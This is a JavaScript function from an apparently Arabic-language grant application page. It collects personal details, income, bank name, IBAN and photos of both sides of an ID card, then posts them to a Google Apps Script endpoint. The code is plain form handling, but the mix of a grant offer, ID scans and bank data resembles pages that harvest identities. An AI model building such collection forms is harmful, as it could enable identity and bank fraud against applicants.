var APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby-fvc-LsoVHWwNdpP1Rvk4jJO-IFP5FBu9u9_6lxVd1fs0UKJPAq4P5dF1EZUfmVAO1Q/exec';

async function saveToGoogleSheets(txNumber) {
    // 1. معالجة الصور (لدينا وجه وخلف للبطاقة في الكود الخاص بك)
    async function getBase64(fileId) {
        var input = document.getElementById(fileId);
        if (input && input.files.length > 0) {
            return await new Promise((resolve) => {
                var reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.readAsDataURL(input.files[0]);
            });
        }
        return "";
    }

    var imgFront = await getBase64('idCardFront'); // يطابق id="idCardFront"
    var imgBack = await getBase64('idCardBack');   // يطابق id="idCardBack"

    // 2. تجميع البيانات مع مطابقة الـ IDs بدقة
    var payload = {
        transaction_id:    txNumber,
        full_name:         document.getElementById('fullName').value,       // كان name وتغير لـ fullName
        country:           document.getElementById('country').value,
        marital_status:    document.getElementById('maritalStatus').value,  // كان marital_status وتغير لـ maritalStatus
        num_children:      document.getElementById('numChildren').value,    // كان num_children وتغير لـ numChildren
        phone:             document.getElementById('phone').value,
        email:             document.getElementById('email').value,
        profession:        document.getElementById('profession').value,
        monthly_income:    document.getElementById('income').value,         // كان monthly_income وتغير لـ income
        grant_type:        document.getElementById('grantType').value,      // كان grant_type وتغير لـ grantType
        grant_amount:      document.getElementById('grantAmount').value,    // كان grant_amount وتغير لـ grantAmount
        grant_description: document.getElementById('grantDescription').value,// كان grant_description وتغير لـ grantDescription
        bank_name:         document.getElementById('bankName').value,       // كان bank_name وتغير لـ bankName
        account_holder:    document.getElementById('accountHolder').value,  // كان account_holder وتغير لـ accountHolder
        iban:              document.getElementById('iban').value.replace(/\s/g, ''),
        
        // إرسال صورتين
        image_front:       imgFront,
        image_back:        imgBack
    };

    try {
        await fetch(APPS_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return true;
    } catch (error) {
        console.error("خطأ:", error);
        return false;
    }
}
